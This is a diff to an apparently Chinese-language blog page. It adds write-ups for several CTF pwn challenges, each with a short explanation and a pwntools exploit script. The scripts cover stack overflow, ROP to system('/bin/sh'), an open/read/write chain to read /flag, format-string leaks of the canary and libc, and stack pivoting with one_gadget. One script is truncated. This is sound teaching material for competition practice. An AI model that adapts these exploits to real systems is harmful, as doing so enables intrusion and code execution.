@@ -30,7 +30,7 @@
 <meta property="og:image" content="http://example.com/00000000/image-20250320113634738.png">
 <meta property="og:image" content="http://example.com/00000000/image-20250320113757543.png">
 <meta property="article:published_time" content="2025-03-17T08:09:00.000Z">
-<meta property="article:modified_time" content="2025-03-20T07:11:01.129Z">
+<meta property="article:modified_time" content="2025-04-02T01:13:59.990Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/00000000/image-20250320113610314.png">
@@ -238,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          465 字
+          1.5k 字
         
       </span>
     
@@ -249,7 +249,7 @@
         
         
         
-          4 分钟
+          13 分钟
         
       </span>
     
@@ -304,6 +304,55 @@
 <p>调试之后发现确实会回到main函数</p>
 <p>exp：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import*<br>from struct import pack<br>import ctypes<br>context(log_level = &#x27;debug&#x27;,arch = &#x27;amd64&#x27;)<br>#p=process(&#x27;./ezstack&#x27;)<br>p=remote(&#x27;27.25.151.12&#x27;,28909)<br>elf=ELF(&#x27;./ezstack&#x27;)<br>#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6&#x27;)<br>libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;)<br>def bug():<br>	gdb.attach(p)<br>	pause()<br>def s(a):<br>	p.send(a)<br>def sa(a,b):<br>	p.sendafter(a,b)<br>def sl(a):<br>	p.sendline(a)<br>def sla(a,b):<br>	p.sendlineafter(a,b)<br>def r(a):<br>	p.recv(a)<br>def pr(a):<br>	print(p.recv(a))<br>def rl(a):<br>	return p.recvuntil(a)<br>def inter():<br>	p.interactive()<br>def get_addr64():<br>	return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>def get_addr32():<br>	return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])<br>def get_sb():<br>	return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()<br>li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)<br>ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)<br>#bug()<br>s(b&#x27;a&#x27;*0x28+b&#x27;\x7c&#x27;)<br>libc_base=get_addr64()-147580<br>li(hex(libc_base))<br>system,bin=get_sb()<br>rdi=libc_base+0x0000000000023b6a<br>pay=b&#x27;a&#x27;*0x28+p64(rdi)+p64(bin)+p64(rdi+1)+p64(system)<br>s(pay)<br>inter()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Orange"><a href="#Orange" class="headerlink" title="Orange"></a>Orange</h2><p><strong>出题⼈：SunD1y</strong></p>
+<p><strong>解题过程：</strong></p>
+<p>菜单题，edit可以溢出，⽆free，使⽤houseoforange 构造largebinattack攻击，接着使⽤edit溢出泄漏heap和libc地址触发 largebin attack，布置好fakeIOFILE之后调⽤exit触发getshell</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python<br># encoding: utf-8<br>from pwn import *<br>import time<br>import numpy as np<br>from pwncli import *<br>local_file  = &#x27;./pwn&#x27;<br>elf = ELF(local_file)<br>libc=ELF(&#x27;libc.so.6&#x27;)<br>context.log_level = &#x27;debug&#x27;<br>context.arch = elf.arch<br>context.terminal = [&#x27;tmux&#x27;,&#x27;neww&#x27;]<br>#,&#x27;&#x27;splitw&#x27;,&#x27;-h&#x27;&#x27;<br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><p><strong>出题⼈:b55t4ck</strong></p>
+<p><strong>解题过程：</strong></p>
+<p>通过nc⼯具连接即可获得flag，linux系统⼀般⾃带nc，Windows可能需要安装nc.exe</p>
+<h2 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h2><p><strong>出题⼈:b55t4ck</strong></p>
+<p><strong>解题过程：</strong></p>
+<p>从IDA里面分析就是，s1越界读取，覆盖为admin，然后进入vuln中，观察到存在数组溢出，通过数组溢出就可以修改溢出长度至ret_addr的位置，随后就可以跳转到后门函数</p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>p=remote(&quot;27.25.151.12&quot;,25632)<br>#p=process(&quot;./pwn&quot;)<br>elf=ELF(&quot;./pwn&quot;)<br>p.sendafter(b&#x27;first i need your team id&#x27;,b&#x27;a&#x27;*0x28+b&#x27;admin&#x27;)<br>#gdb.attach(p)<br><br>p.sendlineafter(b&#x27;please input your 1 girlfriend birthday&#x27;,b&#x27;1&#x27;)<br>p.sendlineafter(b&#x27;please input your 2 girlfriend birthday&#x27;,b&#x27;1&#x27;)<br>p.sendlineafter(b&#x27;please input your 3 girlfriend birthday&#x27;,b&#x27;1&#x27;)<br>p.sendlineafter(b&#x27;please input your 4 girlfriend birthday&#x27;,b&#x27;1&#x27;)<br>p.sendlineafter(b&#x27;please input your 5 girlfriend birthday&#x27;,b&#x27;6&#x27;)<br>p.sendlineafter(b&#x27;please input your 6 girlfriend birthday&#x27;,b&#x27;6&#x27;)<br><br>p.sendlineafter(b&#x27;please input your 8 girlfriend birthday&#x27;,b&#x27;4198942&#x27;)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="ret2orw"><a href="#ret2orw" class="headerlink" title="ret2orw"></a>ret2orw</h2><p><strong>出题⼈:b55t4ck</strong></p>
+<p><strong>解题思路:</strong></p>
+<p>给了后门函数，但是跳转后会出现bad syscall的报错，在init函数中可以看到禁用了system调用。既然可以栈溢出，那么我们就可以利⽤gadget去调⽤libc⾥⾯存在的open,read,write。从⽽读取flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>from struct import pack<br>from ctypes import *<br>import base64<br>#from LibcSearcher import *<br><br>def debug(c = 0):<br>	if(c):<br>		gdb.attach(p, c)<br>	else:<br>		gdb.attach(p)<br>		pause()<br>def get_sb() :<br>    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))<br><br> #------------------------------------------------------------------------------------------------------------------------------<br>s = lambda data : p.send(data)<br>sa  = lambda text,data  :p.sendafter(text, data)<br>sl  = lambda data   :p.sendline(data)<br>sla = lambda text,data  :p.sendlineafter(text, data)<br>r   = lambda num=4096   :p.recv(num)<br>rl  = lambda text   :p.recvuntil(text)<br>pr = lambda num=4096 :print(p.recv(num))<br>inter   = lambda    :p.interactive()<br>l32 = lambda    :u32(p.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>l64 = lambda	:u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>uu32    = lambda    :u32(p.recv(4).ljust(4,b&#x27;\x00&#x27;))<br>uu64    = lambda    :u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))<br>int16   = lambda data   :int(data,16)<br>lg= lambda s, num   :p.success(&#x27;%s -&gt; 0x%x&#x27; % (s, num))<br>#-------------------------------------------------------------------------------------------------------------------------------<br><br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br>#p = process(&#x27;./pwn&#x27;)<br>p=remote(&quot;gz.imxbt.cn&quot;,20370)<br>elf = ELF(&#x27;./pwn&#x27;)<br>libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br> <br>pop_rdi = 0x00000000004012CE<br>ret = 0x4010CF<br><br>#debug(&#x27;b *0x4012a0&#x27;)<br>#gdb.attach(p)<br>sa(b&#x27;this?\n&#x27;, b&#x27;a&#x27;*0x28 + p64(pop_rdi) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.sym[&#x27;puts&#x27;]) + <br>p64(elf.sym[&#x27;main&#x27;]))<br>pause()<br><br>libc_base = uu64() - libc.sym[&#x27;puts&#x27;]<br>print(hex(libc_base))<br>pause()<br><br>system, binsh = get_sb()<br>rax = libc_base + 0x45eb0<br>syscall = libc_base + next(libc.search(asm(&#x27;syscall; ret;&#x27;)))<br>rdi = libc_base + 0x2a3e5<br>rsi = libc_base + 0x2be51<br>rdx_r12 = libc_base + 0x11f2e7<br>mprotect = libc_base + libc.sym[&#x27;mprotect&#x27;]<br>open_ = libc_base + libc.sym[&#x27;open&#x27;]<br>read = libc_base + libc.sym[&#x27;read&#x27;]<br>write = libc_base + libc.sym[&#x27;write&#x27;]<br>buf = 0x4040D0<br>flag = 0x4040a0<br>payload = b&#x27;a&#x27;*0x28<br># read flag -&gt; buf<br>payload += p64(rdi) + p64(0) + p64(rsi) + p64(flag) + p64(rdx_r12) + p64(8)*2 + p64(read)<br># open flag<br>payload += p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rdx_r12) + p64(0)*2 + p64(open_)<br># read flag<br>payload += p64(rdi) + p64(3) + p64(rsi) + p64(buf) + p64(rdx_r12) + p64(0x30)*2 + p64(read)<br># write flag<br>payload += p64(rdi) + p64(1) + p64(write)<br>sa(b&#x27;this?\n&#x27;, payload)<br>sleep(1)<br>s(b&#x27;/flag&#x27;)<br><br>#pause()<br>inter()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="0verf10w"><a href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h2><p><strong>出题⼈:b55t4ck</strong></p>
+<p>⼀道⽐较综合的题⽬，考察栈迁移，格式化字符串，还有防御机制绕过的漏洞，⾸先可以通过格式化字符串泄露canary，和libc。 再通过vuln函数溢出的⼀个字节实现栈迁移，从⽽劫持程序执⾏流，然后再通过one_gadget即可获取shell。需要注意的是，本地环 境需保持与远程⼀致，不然可能出现本地打得通远程打不通的情况。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br> p=remote(&quot;27.25.151.12&quot;,39834)<br> #p=process(&quot;./stack&quot;)<br> elf=ELF(&quot;./stack&quot;)<br> libc=ELF(&quot;/home/giant/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&quot;)<br> #gdb.attach(p)<br> p.sendlineafter(b&#x27;?\n&#x27;,b&#x27;a&#x27;*0x1)<br> p.sendafter(b&#x27;!\n&#x27;,b&#x27;\x00&#x27;*8+b&#x27;%3$p%9$p%15$p&#x27;)<br> libc_base=int(p.recv(14),16)-libc.sym[&quot;read&quot;]-18<br> print(hex(libc_base))<br> canary=int(p.recv(18),16)<br> stack_addr=int(p.recv(14),16)-0x158<br> print(hex(stack_addr))<br> ogg=libc_base+0xebd43<br> kx=libc_base+0x21c100<br> a = int((hex(stack_addr)[-2:]),16)<br> p.sendafter(b&#x27;?\n&#x27;,p64(canary)+p64(kx)+p64(ogg)+p64(canary)+p8(a-8))<br> p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h2><p><strong>出题⼈：Qjzhalx</strong></p>
+<p><strong>解题过程</strong></p>
+<p>利用gets覆盖掉seeds</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>from ctypes import *<br>context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)<br>q = process(&quot;./pwn&quot;)<br>libc = cdll.LoadLibrary(&quot;./libc.so.6&quot;)<br>payload = b&quot;a&quot; * 400 + p64(0)<br>q.sendline(payload)<br>libc.srand(0)<br>for i in range(20001):<br>num = str(libc.rand()%7+1)<br>q.sendline(num)<br>q.recvuntil(&quot;It&#x27;s your reward, take advantage of it.&quot;)<br>q.interactive()<br></code></pre></td></tr></table></figure>
+
+
 
 
                 
